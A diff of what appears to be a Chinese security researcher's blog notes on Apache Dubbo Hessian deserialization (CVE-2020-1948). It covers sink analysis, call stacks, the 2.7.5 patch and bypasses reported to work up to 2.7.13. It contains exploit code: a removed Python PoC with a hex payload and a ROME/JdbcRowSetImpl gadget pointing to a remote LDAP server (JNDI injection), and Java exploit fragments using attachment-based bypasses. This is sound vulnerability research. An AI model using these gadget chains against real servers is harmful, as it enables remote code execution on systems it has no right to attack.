@@ -250,14 +250,10 @@ top.lz2y.service.DemoService (as provider):
 </blockquote>
 <p>在用户使用HTTP协议进行通信时，会将消费者远程的request中POST的数据进行反序列化，而且Dubbo对于消息体未做过滤等处理，所以造成了这次反序列化问题。</p>
 <pre><code>curl 
-</code></pre><h2 id="CVE-2020-1948-Hessian"><a href="#CVE-2020-1948-Hessian" class="headerlink" title="CVE-2020-1948//Hessian"></a>CVE-2020-1948//Hessian</h2><blockquote>
-<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/287658.html">https://www.freebuf.com/vuls/287658.html</a></p>
-</blockquote>
+</code></pre><h2 id="CVE-2020-1948"><a href="#CVE-2020-1948" class="headerlink" title="CVE-2020-1948"></a>CVE-2020-1948</h2><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/287658.html">https://www.freebuf.com/vuls/287658.html</a></p>
 <p><a target="_blank" rel="noopener" href="http://rui0.cn/archives/1338">http://rui0.cn/archives/1338</a></p>
 <p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7969#toc-2">https://xz.aliyun.com/t/7969#toc-2</a></p>
-<p><a target="_blank" rel="noopener" href="https://github.com/threedr3am/dubbo-exp/blob/master/src/main/java/com/threedr3am/exp/dubbo/payload/hessian/RomePoc.java">https://github.com/threedr3am/dubbo-exp/blob/master/src/main/java/com/threedr3am/exp/dubbo/payload/hessian/RomePoc.java</a></p>
-<p><a target="_blank" rel="noopener" href="https://he1m4n6a.github.io/2020/08/10/Apache-Dubbo-Provider%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-1948%EF%BC%89%E5%88%86%E6%9E%90/">https://he1m4n6a.github.io/2020/08/10/Apache-Dubbo-Provider%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-1948%EF%BC%89%E5%88%86%E6%9E%90/</a></p>
-<p>Dubbo Provider默认反序列化 //注:触发任意类toString方法</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/bitterz/p/15526206.html">https://www.cnblogs.com/bitterz/p/15526206.html</a></p>
 <blockquote>
 <p>Apache Dubbo 2.7.0 to 2.7.6</p>
 <p>Apache Dubbo 2.6.0 to 2.6.7</p>
@@ -272,61 +268,12 @@ top.lz2y.service.DemoService (as provider):
     &lt;scope&gt;compile&lt;/scope&gt;
 &lt;/dependency&gt;
 </code></pre><p>攻击依赖于 rome 工具包中的 ToStringBean 工具</p>
-<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><h4 id="python"><a href="#python" class="headerlink" title="python"></a>python</h4><pre><code class="python"># import socket
-# import time
-# import re
-# import binascii
-
-
-# def sendEvilObjData(sock):
-#     payload = b&quot;dabbc2000000000000000000000003b705322e302e3230366f72672e6170616368652e647562626f2e737072696e672e626f6f742e64656d6f2e636f6e73756d65722e44656d6f5365727669636505312e302e300a636f6d6d6f6e54657374124c6a6176612f6c616e672f4f626a6563743b48433027636f6d2e726f6d65746f6f6c732e726f6d652e666565642e696d706c2e457175616c734265616e92036f626a096265616e436c61737360433029636f6d2e726f6d65746f6f6c732e726f6d652e666565642e696d706c2e546f537472696e674265616e92036f626a096265616e436c61737361431d636f6d2e73756e2e726f777365742e4a646263526f77536574496d706cac06706172616d73096c697374656e657273036d61700a6368617253747265616d0b617363696953747265616d0d756e69636f646553747265616d0c62696e61727953747265616d0f7374724d61746368436f6c756d6e730d694d61746368436f6c756d6e73057265734d4406726f77734d4402727302707304636f6e6e09666574636853697a650866657463684469720969736f6c6174696f6e1065736361706550726f63657373696e6708726561644f6e6c790b636f6e63757272656e63790c6d61784669656c6453697a65076d6178526f77730c717565727954696d656f75740b73686f7744656c657465640a726f77536574547970650a64617461536f757263650355524c07636f6d6d616e64624d136a6176612e7574696c2e486173687461626c655a4e4e4e4e4e4e56106a6176612e7574696c2e566563746f729a03666f6f4e4e4e4e4e4e4e4e4e56919a8f8f8f8f8f8f8f8f8f8f4e4e4e4e4e90cbe8925454cbf090909046cbec1d6c6461703a2f2f3132372e302e302e313a383038372f4578706c6f69744e4e430f6a6176612e6c616e672e436c61737391046e616d65631d636f6d2e73756e2e726f777365742e4a646263526f77536574496d706c633029636f6d2e726f6d65746f6f6c732e726f6d652e666565642e696d706c2e546f537472696e674265616e5191519151915a48047061746830366f72672e6170616368652e647562626f2e737072696e672e626f6f742e64656d6f2e636f6e73756d65722e44656d6f536572766963651272656d6f74652e6170706c69636174696f6e3024647562626f2d6175746f2d636f6e6669677572652d636f6e73756d65722d73616d706c6509696e7465726661636530366f72672e6170616368652e647562626f2e737072696e672e626f6f742e64656d6f2e636f6e73756d65722e44656d6f536572766963650776657273696f6e05312e302e305a&quot;
-#     sock.send(binascii.a2b_hex(payload))
-
-
-# def run(dip, dport):
-#     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-#     server_addr = (dip, dport)
-#     sock.connect(server_addr)
-#     sendEvilObjData(sock)
-
-
-# run(&quot;127.0.0.1&quot;, 12345)
-# print(&quot;123&quot;)
-
-# pip3 install dubbo-py
-from dubbo.codec.hessian2 import Decoder, new_object
-from dubbo.client import DubboClient
-
-client = DubboClient(&#39;127.0.0.1&#39;, 12345)
-
-JdbcRowSetImpl = new_object(
-    &#39;com.sun.rowset.JdbcRowSetImpl&#39;,
-    dataSource=&quot;ldap://xxx.xxx.xxx.xxx:1389/o=tomcat&quot;,
-    strMatchColumns=[&quot;foo&quot;]
-)
-JdbcRowSetImplClass = new_object(
-    &#39;java.lang.Class&#39;,
-    name=&quot;com.sun.rowset.JdbcRowSetImpl&quot;,
-)
-toStringBean = new_object(
-    &#39;com.rometools.rome.feed.impl.ToStringBean&#39;,
-    beanClass=JdbcRowSetImplClass,
-    obj=JdbcRowSetImpl
-)
-
-resp = client.send_request_and_return_response(
-    service_name=&#39;cn.rui0&#39;,
-    method_name=&#39;$invoke&#39;,
-    args=[toStringBean])
-print(resp)
-
-</code></pre>
-<h4 id="java"><a href="#java" class="headerlink" title="java"></a>java</h4><p><a target="_blank" rel="noopener" href="https://github.com/lz2y/DubboPOC">https://github.com/lz2y/DubboPOC</a></p>
-<p>bypass有问题，需要手动改改</p>
 <h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>rome依赖 toString-&gt;jndi注入</p>
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/bitterz/p/15526206.html">https://www.cnblogs.com/bitterz/p/15526206.html</a></p>
 <h4 id="python-dubbo2-7-3"><a href="#python-dubbo2-7-3" class="headerlink" title="python //dubbo2.7.3"></a>python //dubbo2.7.3</h4><p>python版本poc成功触发的关键点在于，通过构造一个不存在的<code>service_name</code>使得服务端获取不到期望的DubboExporter进而抛出异常，而在输出异常信息的时候进行了字符串拼接进而调用了隐含的toString方法，所以能够通过构造的恶意对象的toString方法触发漏洞</p>
-<h5 id="sink1"><a href="#sink1" class="headerlink" title="sink1"></a>sink1</h5><p>DubboProtocol</p>
+<h5 id="sink1-后反序列化-除了该exp-lt-2-7-3，其他-lt-2-7-13"><a href="#sink1-后反序列化-除了该exp-lt-2-7-3，其他-lt-2-7-13" class="headerlink" title="sink1//后反序列化//除了该exp&lt;=2.7.3，其他&lt;=2.7.13"></a>sink1//后反序列化//除了该exp&lt;=2.7.3，其他&lt;=2.7.13</h5><blockquote>
+<p>没有使用hashmap，只触发一次命令执行</p>
+</blockquote>
+<p>DubboProtocol</p>
 <pre><code class="java">    Invoker&lt;?&gt; getInvoker(Channel channel, Invocation inv) throws RemotingException &#123;
         ...
         DubboExporter&lt;?&gt; exporter = (DubboExporter)this.exporterMap.get(serviceKey);
@@ -377,7 +324,7 @@ run:748, Thread (java.lang)
 </code></pre><pre><code>    public static String valueOf(Object obj) &#123;
         return (obj == null) ? &quot;null&quot; : obj.toString();
     &#125;
-</code></pre><p>RpcInvocation</p>
+</code></pre><p>RpcInvocation.toString()</p>
 <pre><code class="java">    public String toString() &#123;
         return &quot;RpcInvocation [methodName=&quot; + this.methodName + &quot;, parameterTypes=&quot; + Arrays.toString(this.parameterTypes) + &quot;, arguments=&quot; + Arrays.toString(this.arguments) + &quot;, attachments=&quot; + this.attachments + &quot;]&quot;;
     &#125;//Arrays.toString(this.arguments)
@@ -388,7 +335,128 @@ run:748, Thread (java.lang)
         for (int i = 0; ; i++) &#123;
             b.append(String.valueOf(a[i]));
 </code></pre>
-<h5 id="sink2-bypass4-除了第一个sink其他都可以打2-7-13"><a href="#sink2-bypass4-除了第一个sink其他都可以打2-7-13" class="headerlink" title="sink2//bypass4//除了第一个sink其他都可以打2.7.13"></a>sink2//bypass4//除了第一个sink其他都可以打2.7.13</h5><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/bitterz/p/15526206.html">https://www.cnblogs.com/bitterz/p/15526206.html</a></p>
+<h4 id="dubbo2-7-5"><a href="#dubbo2-7-5" class="headerlink" title="dubbo2.7.5"></a>dubbo2.7.5</h4><p><a target="_blank" rel="noopener" href="https://github.com/apache/dubbo/commit/5618b12340b9c3ecf90c7e01c274a4f094cc146c#diff-37a8a427d2ec646f392ebd9225019346">https://github.com/apache/dubbo/commit/5618b12340b9c3ecf90c7e01c274a4f094cc146c#diff-37a8a427d2ec646f392ebd9225019346</a></p>
+<h5 id="补丁"><a href="#补丁" class="headerlink" title="补丁"></a>补丁</h5><p>DubboProtocol.getInvocationWithoutData</p>
+<pre><code class="java">if (exporter == null) &#123;
+            throw new RemotingException(channel, &quot;Not found exported service: &quot; + serviceKey + &quot; in &quot; + this.exporterMap.keySet() + &quot;, may be version or group mismatch , channel: consumer: &quot; + channel.getRemoteAddress() + &quot; --&gt; provider: &quot; + channel.getLocalAddress() + &quot;, message:&quot; + this.getInvocationWithoutData(inv));
+</code></pre>
+<pre><code class="java">    private Invocation getInvocationWithoutData(Invocation invocation) &#123;
+        if (this.logger.isDebugEnabled()) &#123;//开启debug 仍可触发
+            return invocation;
+        &#125; else if (invocation instanceof RpcInvocation) &#123;
+            RpcInvocation rpcInvocation = (RpcInvocation)invocation;
+            rpcInvocation.setArguments((Object[])null);//清空防止 RpcInvocation.toString 触发 Arrays.toString(this.arguments)
+            return rpcInvocation;
+        &#125; else &#123;
+            return invocation;
+        &#125;
+    &#125;
+</code></pre>
+<h5 id="sink1-但是attachments"><a href="#sink1-但是attachments" class="headerlink" title="sink1//但是attachments"></a>sink1//但是attachments</h5><blockquote>
+<p>dubbo2.7.5 补丁只清空 arguments</p>
+</blockquote>
+<p>java exp 设置 attachments</p>
+<p>重点关注几个 in.readxxx()，exp对应out.writexxx()</p>
+<pre><code class="java">    public Object decode(Channel channel, InputStream input) throws IOException &#123;
+        ObjectInput in = CodecSupport.getSerialization(channel.getUrl(), this.serializationType).deserialize(channel.getUrl(), input);
+        this.put(&quot;serialization_id&quot;, this.serializationType);
+        String dubboVersion = in.readUTF();
+        this.request.setVersion(dubboVersion);
+        this.setAttachment(&quot;dubbo&quot;, dubboVersion);
+        String path = in.readUTF();
+        this.setAttachment(&quot;path&quot;, path);
+        String version = in.readUTF();
+        this.setAttachment(&quot;version&quot;, version);
+        this.setMethodName(in.readUTF());
+        String desc = in.readUTF();
+        this.setParameterTypesDesc(desc);
+
+        try &#123;
+            if (ConfigurationUtils.getSystemConfiguration().getBoolean(&quot;serialization.security.check&quot;, false)) &#123;
+                CodecSupport.checkSerialization(path, version, this.serializationType);
+            &#125;
+
+            Object[] args = DubboCodec.EMPTY_OBJECT_ARRAY;
+            Class&lt;?&gt;[] pts = DubboCodec.EMPTY_CLASS_ARRAY;
+            if (desc.length() &gt; 0) &#123;
+                //&quot;&quot;.length()=0
+            &#125;
+            this.setParameterTypes(pts);
+            Map&lt;String, Object&gt; map = in.readAttachments();//bypass3//触发hashmap的put
+            if (map != null &amp;&amp; map.size() &gt; 0) &#123;
+                Map&lt;String, Object&gt; attachment = this.getObjectAttachments();
+                if (attachment == null) &#123;
+                    attachment = new HashMap();
+                &#125;
+
+                ((Map)attachment).putAll(map);
+                this.setObjectAttachments((Map)attachment);//设置attachment//后续触发toString
+            &#125;
+</code></pre>
+<ul>
+<li>exp//bypass1可以简化//并且绕过2.7.7</li>
+</ul>
+<pre><code class="java">        out.writeUTF(dubbover);
+        out.writeUTF(path);
+        out.writeUTF(server_ver);
+        out.writeUTF(method);
+//        out.writeUTF(&quot;Ljava/lang/Object;&quot;);
+//        out.writeObject(&quot;sayHello1&quot;);
+        out.writeUTF(&quot;&quot;);
+
+        HashMap attachments = getJNDI1(uri);//attachments
+        out.writeObject(attachments);
+</code></pre>
+<p>触发两次命令执行</p>
+<pre><code>getInvoker:264, DubboProtocol (org.apache.dubbo.rpc.protocol.dubbo)
+reply:123, DubboProtocol$1 (org.apache.dubbo.rpc.protocol.dubbo)
+received:155, DubboProtocol$1 (org.apache.dubbo.rpc.protocol.dubbo)
+received:177, HeaderExchangeHandler (org.apache.dubbo.remoting.exchange.support.header)
+received:51, DecodeHandler (org.apache.dubbo.remoting.transport)
+run:57, ChannelEventRunnable (org.apache.dubbo.remoting.transport.dispatcher)
+runWorker:1149, ThreadPoolExecutor (java.util.concurrent)
+run:624, ThreadPoolExecutor$Worker (java.util.concurrent)
+run:41, InternalRunnable (org.apache.dubbo.common.threadlocal)
+run:748, Thread (java.lang)
+</code></pre><pre><code>toString:442, RpcInvocation (org.apache.dubbo.rpc)
+safeToString:63, Request (org.apache.dubbo.remoting.exchange)
+toString:143, Request (org.apache.dubbo.remoting.exchange)
+valueOf:2994, String (java.lang)
+append:131, StringBuilder (java.lang)
+run:59, ChannelEventRunnable (org.apache.dubbo.remoting.transport.dispatcher)
+runWorker:1149, ThreadPoolExecutor (java.util.concurrent)
+run:624, ThreadPoolExecutor$Worker (java.util.concurrent)
+run:41, InternalRunnable (org.apache.dubbo.common.threadlocal)
+run:748, Thread (java.lang)
+</code></pre><h5 id="区别点"><a href="#区别点" class="headerlink" title="区别点"></a>区别点</h5><p>DubboCodec.decodeBody</p>
+<pre><code class="java">    protected Object decodeBody(Channel channel, InputStream is, byte[] header) throws IOException &#123;
+        byte flag = header[2];
+        byte proto = (byte)(flag &amp; 31);
+        long id = Bytes.bytes2long(header, 4);
+        ObjectInput in;
+        if ((flag &amp; -128) == 0) &#123;
+            ...
+        &#125;
+        &#125; else &#123;
+            Request req = new Request(id);
+            req.setVersion(Version.getProtocolVersion());
+            req.setTwoWay((flag &amp; 64) != 0);
+            if ((flag &amp; 32) != 0) &#123;
+                req.setEvent(true);
+            &#125;
+
+            try &#123;
+                Object data;
+                if (req.isEvent()) &#123;//其他sink
+                    in = CodecSupport.deserialize(channel.getUrl(), is, proto);
+                    data = this.decodeEventData(channel, in);
+                &#125; else &#123;
+                    DecodeableRpcInvocation inv;
+                    if (channel.getUrl().getParameter(&quot;decode.in.io&quot;, false)) &#123;
+                        inv = new DecodeableRpcInvocation(channel, req, is, proto);
+                        inv.decode();//sink1
+</code></pre>
+<h5 id="sink2-后反序列化"><a href="#sink2-后反序列化" class="headerlink" title="sink2//后反序列化"></a>sink2//后反序列化</h5><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/bitterz/p/15526206.html">https://www.cnblogs.com/bitterz/p/15526206.html</a></p>
 <blockquote>
 <p>在readUTF的位置writeObject(HashMap)</p>
 </blockquote>
@@ -451,85 +519,18 @@ run:748, Thread (java.lang)
         default:
             throw this.expect(&quot;string&quot;, tag);//tag=72 进入sink
 </code></pre>
-<h4 id="dubbo反序列化实现原理-能不能直接触发readObject反序列化呢-不能"><a href="#dubbo反序列化实现原理-能不能直接触发readObject反序列化呢-不能" class="headerlink" title="dubbo反序列化实现原理//能不能直接触发readObject反序列化呢//不能"></a>dubbo反序列化实现原理//能不能直接触发readObject反序列化呢//不能</h4><p><a target="_blank" rel="noopener" href="https://juejin.cn/post/6844903632207364104">https://juejin.cn/post/6844903632207364104</a></p>
-<blockquote>
-<p>decode:112, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo)<br>decode:73, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo)<br>decodeBody:132, DubboCodec (org.apache.dubbo.rpc.protocol.dubbo)<br>decode:122, ExchangeCodec (org.apache.dubbo.remoting.exchange.codec)<br>decode:82, ExchangeCodec (org.apache.dubbo.remoting.exchange.codec)<br>decode:48, DubboCountCodec (org.apache.dubbo.rpc.protocol.dubbo)<br>decode:90, NettyCodecAdapter$InternalDecoder (org.apache.dubbo.remoting.transport.netty4)<br>decodeRemovalReentryProtection:502, ByteToMessageDecoder (io.netty.handler.codec)<br>callDecode:441, ByteToMessageDecoder (io.netty.handler.codec)<br>channelRead:278, ByteToMessageDecoder (io.netty.handler.codec)<br>invokeChannelRead:374, AbstractChannelHandlerContext (io.netty.channel)<br>invokeChannelRead:360, AbstractChannelHandlerContext (io.netty.channel)<br>fireChannelRead:352, AbstractChannelHandlerContext (io.netty.channel)<br>channelRead:1408, DefaultChannelPipeline$HeadContext (io.netty.channel)<br>invokeChannelRead:374, AbstractChannelHandlerContext (io.netty.channel)<br>invokeChannelRead:360, AbstractChannelHandlerContext (io.netty.channel)<br>fireChannelRead:930, DefaultChannelPipeline (io.netty.channel)<br>read:163, AbstractNioByteChannel$NioByteUnsafe (io.netty.channel.nio)<br>processSelectedKey:682, NioEventLoop (io.netty.channel.nio)<br>processSelectedKeysOptimized:617, NioEventLoop (io.netty.channel.nio)<br>processSelectedKeys:534, NioEventLoop (io.netty.channel.nio)<br>run:496, NioEventLoop (io.netty.channel.nio)<br>run:906, SingleThreadEventExecutor$5 (io.netty.util.concurrent)<br>run:74, ThreadExecutorMap$2 (io.netty.util.internal)<br>run:30, FastThreadLocalRunnable (io.netty.util.concurrent)<br>run:748, Thread (java.lang)</p>
-</blockquote>
-<pre><code class="java">    public Object decode(Channel channel, InputStream input) throws IOException &#123;
-        ObjectInput in = CodecSupport.getSerialization(channel.getUrl(), this.serializationType).deserialize(channel.getUrl(), input);
-        String dubboVersion = in.readUTF();
-        this.request.setVersion(dubboVersion);
-        this.setAttachment(&quot;dubbo&quot;, dubboVersion);
-        this.setAttachment(&quot;path&quot;, in.readUTF());
-        this.setAttachment(&quot;version&quot;, in.readUTF());
-        this.setMethodName(in.readUTF());
+<ul>
+<li>exp</li>
+</ul>
+<p>只触发一次命令执行</p>
+<pre><code>        out.writeUTF(dubbover);
+        out.writeUTF(path);
+        out.writeUTF(server_ver);
+        out.writeUTF(method);
+//        out.writeObject(&quot;sayHello1&quot;);//注释两行//bypass4 触发点在bypass3前 不受2.7.7限制
 
-        try &#123;
-            String desc = in.readUTF();
-            Object[] args;
-            Class[] pts;
-            if (desc.length() == 0) &#123;
-                pts = DubboCodec.EMPTY_CLASS_ARRAY;
-                args = DubboCodec.EMPTY_OBJECT_ARRAY;
-            &#125; else &#123;
-                pts = ReflectUtils.desc2classArray(desc);//Class.forName 实现
-                args = new Object[pts.length];
-
-                for(int i = 0; i &lt; args.length; ++i) &#123;
-                    try &#123;
-                        args[i] = in.readObject(pts[i]);
-</code></pre>
-<p>org.apache.dubbo.common.serialize.hessian2.Hessian2ObjectInput</p>
-<pre><code>    public &lt;T&gt; T readObject(Class&lt;T&gt; cls) throws IOException, ClassNotFoundException &#123;
-        return this.mH2i.readObject(cls);
-    &#125;
-</code></pre><p><strong>使用dubbo的Hessian2ObjectInput.readObject 不会触发java原生的 readObject</strong></p>
-<h4 id="Hessian-反序列化-dubbo2-7-5"><a href="#Hessian-反序列化-dubbo2-7-5" class="headerlink" title="Hessian 反序列化//dubbo2.7.5"></a>Hessian 反序列化//dubbo2.7.5</h4><p><a target="_blank" rel="noopener" href="https://github.com/apache/dubbo/commit/5618b12340b9c3ecf90c7e01c274a4f094cc146c#diff-37a8a427d2ec646f392ebd9225019346">https://github.com/apache/dubbo/commit/5618b12340b9c3ecf90c7e01c274a4f094cc146c#diff-37a8a427d2ec646f392ebd9225019346</a></p>
-<h5 id="补丁"><a href="#补丁" class="headerlink" title="补丁"></a>补丁</h5><p>DubboProtocol.getInvocationWithoutData</p>
-<pre><code class="java">if (exporter == null) &#123;
-            throw new RemotingException(channel, &quot;Not found exported service: &quot; + serviceKey + &quot; in &quot; + this.exporterMap.keySet() + &quot;, may be version or group mismatch , channel: consumer: &quot; + channel.getRemoteAddress() + &quot; --&gt; provider: &quot; + channel.getLocalAddress() + &quot;, message:&quot; + this.getInvocationWithoutData(inv));
-</code></pre>
-<pre><code class="java">    private Invocation getInvocationWithoutData(Invocation invocation) &#123;
-        if (this.logger.isDebugEnabled()) &#123;//开启debug 仍可触发
-            return invocation;
-        &#125; else if (invocation instanceof RpcInvocation) &#123;
-            RpcInvocation rpcInvocation = (RpcInvocation)invocation;
-            rpcInvocation.setArguments((Object[])null);//清空防止 RpcInvocation.toString 触发 Arrays.toString(this.arguments)
-            return rpcInvocation;
-        &#125; else &#123;
-            return invocation;
-        &#125;
-    &#125;
-</code></pre>
-<h5 id="区别点"><a href="#区别点" class="headerlink" title="区别点"></a>区别点</h5><p>DubboCodec.decodeBody</p>
-<pre><code class="java">    protected Object decodeBody(Channel channel, InputStream is, byte[] header) throws IOException &#123;
-        byte flag = header[2];
-        byte proto = (byte)(flag &amp; 31);
-        long id = Bytes.bytes2long(header, 4);
-        ObjectInput in;
-        if ((flag &amp; -128) == 0) &#123;
-            ...
-        &#125;
-        &#125; else &#123;
-            Request req = new Request(id);
-            req.setVersion(Version.getProtocolVersion());
-            req.setTwoWay((flag &amp; 64) != 0);
-            if ((flag &amp; 32) != 0) &#123;
-                req.setEvent(true);
-            &#125;
-
-            try &#123;
-                Object data;
-                if (req.isEvent()) &#123;//2.7.6
-                    in = CodecSupport.deserialize(channel.getUrl(), is, proto);
-                    data = this.decodeEventData(channel, in);
-                &#125; else &#123;
-                    DecodeableRpcInvocation inv;
-                    if (channel.getUrl().getParameter(&quot;decode.in.io&quot;, false)) &#123;
-                        inv = new DecodeableRpcInvocation(channel, req, is, proto);
-                        inv.decode();//2.7.3
-</code></pre>
-<h5 id="sink3-bypass3"><a href="#sink3-bypass3" class="headerlink" title="sink3 //bypass3"></a><strong>sink</strong>3 //bypass3</h5><p>com.alibaba.com.caucho.hessian.io.MapDeserializer</p>
+        HashMap attachments = getJNDI1(uri);
+</code></pre><h5 id="sink3-反序列化-后反序列化"><a href="#sink3-反序列化-后反序列化" class="headerlink" title="sink3//反序列化+后反序列化"></a><strong>sink</strong>3//反序列化+后反序列化</h5><p>com.alibaba.com.caucho.hessian.io.MapDeserializer</p>
 <pre><code class="java">    protected void doReadMap(AbstractHessianInput in, Map map, Class&lt;?&gt; keyType, Class&lt;?&gt; valueType) throws IOException &#123;
         Deserializer keyDeserializer = null;
         Deserializer valueDeserializer = null;
@@ -546,119 +547,46 @@ run:748, Thread (java.lang)
             map.put(keyDeserializer != null ? keyDeserializer.readObject(in) : in.readObject(), valueDeserializer != null ? valueDeserializer.readObject(in) : in.readObject());
         &#125;
 </code></pre>
-<p>调用链</p>
-<pre><code>doReadMap:134, MapDeserializer (com.alibaba.com.caucho.hessian.io)
-readMap:126, MapDeserializer (com.alibaba.com.caucho.hessian.io)
-readObject:2703, Hessian2Input (com.alibaba.com.caucho.hessian.io)
-readObject:2278, Hessian2Input (com.alibaba.com.caucho.hessian.io)
-readObject:2080, Hessian2Input (com.alibaba.com.caucho.hessian.io)
-readObject:2074, Hessian2Input (com.alibaba.com.caucho.hessian.io)
-readObject:92, Hessian2ObjectInput (org.apache.dubbo.common.serialize.hessian2)
-decode:139, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo)
-decode:79, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo)
-decode:57, DecodeHandler (org.apache.dubbo.remoting.transport)
-received:44, DecodeHandler (org.apache.dubbo.remoting.transport)
-run:57, ChannelEventRunnable (org.apache.dubbo.remoting.transport.dispatcher)
-runWorker:1149, ThreadPoolExecutor (java.util.concurrent)
-run:624, ThreadPoolExecutor$Worker (java.util.concurrent)
-run:748, Thread (java.lang)
-</code></pre><p>hashmap.put(key,value)-&gt;key.toString()//java反序列化gadgets</p>
-<h5 id="绕过补丁-bypass5"><a href="#绕过补丁-bypass5" class="headerlink" title="绕过补丁//bypass5"></a>绕过补丁//bypass5</h5><p>原有sink，但是构造错误的序列化字符串，绕过清除</p>
+<ul>
+<li>exp</li>
+</ul>
+<pre><code>//        String path = &quot;org.apache.dubbo.spring.boot.demo.consumer.DemoService&quot;;
+        String path = &quot;org.apache.dubbo.samples.basic.api.DemoService&quot;;
+//        String path = &quot;top.lz2y.service.DemoService1&quot;;
+//        String server_ver = &quot;1.0.0&quot;;
+        String server_ver = &quot;&quot;;
+//        String method = &quot;any&quot;;// &lt;=2.7.6
+        String method = &quot;$echo&quot;;//add 2.7.7-2.7.12
+        out.writeUTF(dubbover);
+        out.writeUTF(path);
+        out.writeUTF(server_ver);
+        out.writeUTF(method);
+        //todo 方法描述不需要修改，因为此处需要指定map的payload去触发
+        out.writeUTF(&quot;Ljava/lang/Object;&quot;);
+        out.writeObject(&quot;any&quot;);
+
+        HashMap attachments = getJNDI2(uri);//2.7.13执行5次//使用EqualsBean//正确的path可以-2次
+//        HashMap attachments = getJNDI1(uri);//attachments//2.7.13执行3次
+        out.writeObject(attachments);
+</code></pre><p>三次命令执行</p>
+<p>反序列化</p>
 <pre><code>getDatabaseMetaData:4004, JdbcRowSetImpl (com.sun.rowset)
-invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
-invoke:62, NativeMethodAccessorImpl (sun.reflect)
+invoke:-1, GeneratedMethodAccessor11 (sun.reflect)
 invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
 invoke:498, Method (java.lang.reflect)
 toString:158, ToStringBean (com.rometools.rome.feed.impl)
 toString:129, ToStringBean (com.rometools.rome.feed.impl)
-valueOf:2994, String (java.lang)
-append:131, StringBuilder (java.lang)
-toString:559, AbstractMap (java.util)
-valueOf:2994, String (java.lang)
-append:131, StringBuilder (java.lang)
-toString:429, RpcInvocation (org.apache.dubbo.rpc)
-safeToString:63, Request (org.apache.dubbo.remoting.exchange)
-toString:133, Request (org.apache.dubbo.remoting.exchange)
-valueOf:2994, String (java.lang)
-append:131, StringBuilder (java.lang)
-run:59, ChannelEventRunnable (org.apache.dubbo.remoting.transport.dispatcher)
-runWorker:1149, ThreadPoolExecutor (java.util.concurrent)
-run:624, ThreadPoolExecutor$Worker (java.util.concurrent)
-run:748, Thread (java.lang)
-</code></pre><h5 id="sink1-但是attachments"><a href="#sink1-但是attachments" class="headerlink" title="sink1//但是attachments"></a>sink1//但是attachments</h5><blockquote>
-<p>只清空 arguments</p>
-</blockquote>
-<pre><code>    public Object decode(Channel channel, InputStream input) throws IOException &#123;
-        ObjectInput in = CodecSupport.getSerialization(channel.getUrl(), this.serializationType).deserialize(channel.getUrl(), input);
-        this.put(&quot;serialization_id&quot;, this.serializationType);
-        String dubboVersion = in.readUTF();
-        this.request.setVersion(dubboVersion);
-        this.setAttachment(&quot;dubbo&quot;, dubboVersion);
-        String path = in.readUTF();
-        this.setAttachment(&quot;path&quot;, path);
-        String version = in.readUTF();
-        this.setAttachment(&quot;version&quot;, version);
-        this.setMethodName(in.readUTF());
-        String desc = in.readUTF();
-        this.setParameterTypesDesc(desc);
-
-        try &#123;
-            if (ConfigurationUtils.getSystemConfiguration().getBoolean(&quot;serialization.security.check&quot;, false)) &#123;
-                CodecSupport.checkSerialization(path, version, this.serializationType);
-            &#125;
-
-            Object[] args = DubboCodec.EMPTY_OBJECT_ARRAY;
-            Class&lt;?&gt;[] pts = DubboCodec.EMPTY_CLASS_ARRAY;
-            if (desc.length() &gt; 0) &#123;
-                ServiceRepository repository = ApplicationModel.getServiceRepository();
-                ServiceDescriptor serviceDescriptor = repository.lookupService(path);
-                if (serviceDescriptor != null) &#123;
-                    MethodDescriptor methodDescriptor = serviceDescriptor.getMethod(this.getMethodName(), desc);
-                    if (methodDescriptor != null) &#123;
-                        pts = methodDescriptor.getParameterClasses();
-                        this.setReturnTypes(methodDescriptor.getReturnTypes());
-                    &#125;
-                &#125;
-
-                if (pts == DubboCodec.EMPTY_CLASS_ARRAY) &#123;
-                    if (!RpcUtils.isGenericCall(desc, this.getMethodName()) &amp;&amp; !RpcUtils.isEcho(desc, this.getMethodName())) &#123;
-                        throw new IllegalArgumentException(&quot;Service not found:&quot; + path + &quot;, &quot; + this.getMethodName());
-                    &#125;
-
-                    pts = ReflectUtils.desc2classArray(desc);
-                &#125;
-
-                args = new Object[pts.length];
-
-                for(int i = 0; i &lt; args.length; ++i) &#123;
-                    try &#123;
-                        args[i] = in.readObject(pts[i]);
-                    &#125; catch (Exception var18) &#123;
-                        if (log.isWarnEnabled()) &#123;
-                            log.warn(&quot;Decode argument failed: &quot; + var18.getMessage(), var18);
-                        &#125;
-                    &#125;
-                &#125;
-            &#125;
-
-            this.setParameterTypes(pts);
-            Map&lt;String, Object&gt; map = in.readAttachments();//bypass3//触发hashmap的put
-            if (map != null &amp;&amp; map.size() &gt; 0) &#123;
-                Map&lt;String, Object&gt; attachment = this.getObjectAttachments();
-                if (attachment == null) &#123;
-                    attachment = new HashMap();
-                &#125;
-
-                ((Map)attachment).putAll(map);
-                this.setObjectAttachments((Map)attachment);//设置attachment//后续触发toString
-            &#125;
-</code></pre><p>calc1</p>
-<pre><code>toString:442, RpcInvocation (org.apache.dubbo.rpc)
-valueOf:2994, String (java.lang)
-append:131, StringBuilder (java.lang)
-getInvoker:267, DubboProtocol (org.apache.dubbo.rpc.protocol.dubbo)
-decodeInvocationArgument:292, CallbackServiceCodec (org.apache.dubbo.rpc.protocol.dubbo)
